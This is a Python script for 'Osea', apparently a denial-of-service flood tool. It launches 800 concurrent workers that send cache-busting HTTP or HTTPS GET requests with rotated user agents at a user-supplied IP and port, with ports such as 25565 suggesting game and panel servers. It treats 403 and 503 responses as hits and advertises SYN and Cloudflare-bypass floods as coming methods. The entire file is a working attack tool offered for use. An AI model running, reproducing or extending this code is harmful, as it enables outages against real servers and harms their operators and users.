#!/usr/bin/env python3
import aiohttp
import asyncio
import random
import time
from colorama import Fore, Style, init

# Initialize colorama
init()

class Osea:
    def __init__(self):
        self.sent = 0
        self.success = 0
        self.failed = 0
        self.running = False
        self.workers = 800  # Optimized for Pterodactyl nodes
        self.user_agents = [
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:89.0) Gecko/20100101 Firefox/89.0",
            "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
            "Mozilla/5.0 (iPhone; CPU iPhone OS 14_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0 Mobile/15E148 Safari/604.1"
        ]

    def display_banner(self):
        print(Fore.RED + r"""
|----------------------|
   ___  _____   ___  
  / _ \/ _ \ \ / / |  
 | | | | | |\ V /| |  
 | |_| | |_| | | | |__ 
  \___/\___/ |_| |____|
|----------------------|
""" + Style.RESET_ALL)
        print(Fore.RED + "developed by Necuix\n" + Style.RESET_ALL)
        print(Fore.RED + "Powered by Osea API\n" + Style.RESET_ALL)

    async def http_attack(self, target, port, duration):
        self.running = True
        self.sent = 0
        self.success = 0
        self.failed = 0

        connector = aiohttp.TCPConnector(force_close=True, limit=0)
        async with aiohttp.ClientSession(connector=connector) as session:
            tasks = []
            for _ in range(self.workers):
                task = asyncio.create_task(self._send_request(target, port, session, duration, False))
                tasks.append(task)

            start_time = time.time()
            while time.time() - start_time < duration and self.running:
                self._display_stats()
                await asyncio.sleep(0.5)

            await asyncio.gather(*tasks)
            self._display_stats()
            print("\nAttack completed!")

    async def https_attack(self, target, port, duration):
        self.running = True
        self.sent = 0
        self.success = 0
        self.failed = 0

        connector = aiohttp.TCPConnector(force_close=True, limit=0, ssl=False)
        async with aiohttp.ClientSession(connector=connector) as session:
            tasks = []
            for _ in range(self.workers):
                task = asyncio.create_task(self._send_request(target, port, session, duration, True))
                tasks.append(task)

            start_time = time.time()
            while time.time() - start_time < duration and self.running:
                self._display_stats()
                await asyncio.sleep(0.5)

            await asyncio.gather(*tasks)
            self._display_stats()
            print("\nAttack completed!")

    async def _send_request(self, target, port, session, duration, is_https):
        start_time = time.time()
        while time.time() - start_time < duration and self.running:
            try:
                protocol = "https" if is_https else "http"
                url = f"{protocol}://{target}:{port}/?{random.randint(0, 9999)}"
                headers = {
                    "Host": target,
                    "User-Agent": random.choice(self.user_agents),
                    "Accept": "*/*",
                    "Accept-Language": "en-US,en;q=0.9",
                    "Connection": "keep-alive",
                    "Cache-Control": "no-cache",
                    "Pragma": "no-cache",
                    "Referer": f"{protocol}://{target}/"
                }

                if port in (2020, 8080, 25565):
                    headers["X-Requested-With"] = "XMLHttpRequest"

                async with session.get(url, headers=headers, timeout=5, ssl=False) as response:
                    self.sent += 1
                    if response.status in (200, 403, 503):
                        self.success += 1
                    else:
                        self.failed += 1
            except Exception:
                self.failed += 1

    def _display_stats(self):
        print(Fore.RED + f"\rTRAFFIC SENT: {self.sent} | SUCCESS: {self.success} | FAILED: {self.failed}" + Style.RESET_ALL, end="", flush=True)

    def _validate_input(self, prompt, validator, default=None):
        while True:
            try:
                value = input(prompt).strip()
                if not value and default is not None:
                    return default
                if validator(value):
                    return value
                print(Fore.RED + "Invalid input. Please try again." + Style.RESET_ALL)
            except KeyboardInterrupt:
                print("\nOperation cancelled by user.")
                exit()

    def main_menu(self):
        self.display_banner()
        print(Fore.RED + "Available methods:")
        print("1. HTTP BUST")
        print("2. HTTPS BUST\n")
        print("Upcoming methods:")
        print("1. CF BUST")
        print("2. SYN BUST")
        print("3. SIMPLE BUST\n")

        method = self._validate_input("Choose from the available methods (1-2): ", lambda x: x in ['1', '2'])
        target = self._validate_input("Enter Target IPv4: ", 
                                   lambda x: len(x.split('.')) == 4 and all(0 <= int(p) <= 255 for p in x.split('.')))
        port = self._validate_input("Enter Port (e.g. 80/443/2020/25565): ", 
                                 lambda x: x.isdigit() and 1 <= int(x) <= 65535)
        duration = self._validate_input("Enter Duration (max 120s): ", 
                                     lambda x: x.isdigit() and 1 <= int(x) <= 120)

        print(Fore.RED + f"\nStarting attack on {target}:{port}..." + Style.RESET_ALL)
        if method == "1":
            asyncio.run(self.http_attack(target, int(port), int(duration)))
        elif method == "2":
            asyncio.run(self.https_attack(target, int(port), int(duration)))

if __name__ == "__main__":
    tool = Osea()
    tool.main_menu()
